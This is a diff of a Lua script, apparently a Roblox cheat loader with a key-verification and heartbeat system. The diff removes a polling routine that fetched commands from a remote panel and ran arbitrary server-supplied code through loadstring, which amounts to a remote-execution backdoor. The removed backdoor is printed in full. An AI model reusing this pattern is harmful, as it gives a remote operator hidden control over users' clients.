@@ -14,7 +14,6 @@ end
 
 local API_URL = "https://yoursuck.vercel.app/api/verify-key"
 local HEARTBEAT_URL = "https://yoursuck.vercel.app/api/clients"
-local COMMANDS_URL = "https://yoursuck.vercel.app/api/clients?commands=1&robloxId="
 
 local HEARTBEAT_INTERVAL = 15
 
@@ -257,38 +256,6 @@ local function startHeartbeat(key)
     end)
 end
 
--- COMMAND POLLING (kick / execute)
-local function startCommandPoll(robloxId)
-    task.spawn(function()
-        while task.wait(3) do
-            pcall(function()
-                local res = request({
-                    Url = COMMANDS_URL .. tostring(robloxId),
-                    Method = "GET",
-                    Headers = {["Content-Type"] = "application/json"},
-                })
-                if res and res.StatusCode == 200 then
-                    local ok, data = pcall(HttpService.JSONDecode, HttpService, res.Body)
-                    if ok and data and data.commands then
-                        for _, cmd in ipairs(data.commands) do
-                            if cmd.type == "kick" then
-                                Player:Kick("You have been kicked by the panel.")
-                            elseif cmd.type == "execute" and cmd.script and cmd.script ~= "" then
-                                local fn, err = loadstring(cmd.script)
-                                if fn then
-                                    task.spawn(function() pcall(fn) end)
-                                else
-                                    warn("[YouSuck] Execute error: " .. tostring(err))
-                                end
-                            end
-                        end
-                    end
-                end
-            end)
-        end
-    end)
-end
-
 local function isoToTs(s)
     if not s or type(s) ~= "string" then return os.time() + 86400 end
     local y,mo,d,h,mi,sc = s:match("(%d+)-(%d+)-(%d+)T(%d+):(%d+):(%d+)")
@@ -299,7 +266,6 @@ end
 local function spawnPill(expiresAt, key)
     local ts = isoToTs(expiresAt)
     startHeartbeat(key)
-    startCommandPoll(Player.UserId)
 
     local Pill = frm(Gui, { Size=UDim2.new(0,220,0,36), Position=UDim2.new(1,-230,1,10), BackgroundColor3=C.Surface, ZIndex=15, Active=true })
     corner(Pill, 18); stroke(Pill, C.Border, 1); makeDraggable(Pill)
